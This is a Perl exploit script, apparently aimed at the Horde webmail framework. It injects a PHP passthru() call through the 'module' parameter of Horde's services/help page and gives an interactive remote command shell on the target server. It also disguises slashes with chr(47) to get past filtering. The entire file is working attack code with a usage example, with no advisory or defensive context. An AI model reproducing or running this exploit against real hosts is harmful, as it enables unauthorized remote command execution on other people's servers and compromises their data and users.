

use strict;
use LWP::UserAgent;
use LWP::Simple;
use HTTP::Request;
use HTTP::Response;
use Getopt::Long;

$| = 1;

my ($proxy,$proxy_user,$proxy_pass);
my ($host,$debug,$dir, $command);
my $use_ssl = 0;

my $options = GetOptions (
  'host=s'      => \$host, 
  'dir=s'      => \$dir,
  'proxy=s'           => \$proxy,
  'proxy_user=s'      => \$proxy_user,
  'proxy_pass=s'      => \$proxy_pass,
  'debug'             => \$debug);

&help unless ($host);

$dir = "/horde/" unless($dir);
print "$host - $dir\n";

while () {
print "[1;34m[[1;33mapache[1;32m@[1;36mMorfeus [1;34m][0m\$ ";
while(<STDIN>) {
$command=$_;
chomp($command);
last;
}
&send($command);
}

sub buildcmd {
my ($cmd) = @_;
# wonderful hacking
$cmd =~ s/ /\%20/gi;
$cmd =~ s/\//\"\.chr\(47\)\.\"/gi;

return $cmd;
}

sub send {
    my ($tmp) = @_;
    my $ok=0;
    my $cmd = buildcmd ($tmp); 
    my $socket;
    LWP::Debug::level('+') if $debug;

    my $ua = new LWP::UserAgent();   
    $ua->agent("Nozilla/P.N (Just for IDS woring)");

    my $string = "/$dir/services/help/?show=about&module=;\".passthru(\"$cmd\");'.";

    if ($host !~ /^http/) { $host = sprintf ("http://%s", $host);
    }

    my $req = HTTP::Request->new (GET => $host.$string);
    $ua->proxy(['http'] => $proxy) if $proxy;
    $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

    print $req->as_string() if $debug; 

    my $res = $ua->request($req);
    my $html = $res->content(); 

    foreach (split(/\n/,$html)) {
if ((/<h2/) or (/<br \/>/)) {
last;
}
print "$_\n" if $ok eq "1";
if (/<body class=/) {
$ok = 1;
}  
    }
}

sub help {
    print "[+] Exemplu\n";
    print "[+] $0 --host=www.server.com --dir=/horde/\n";
    exit(1);
}
exit 0;
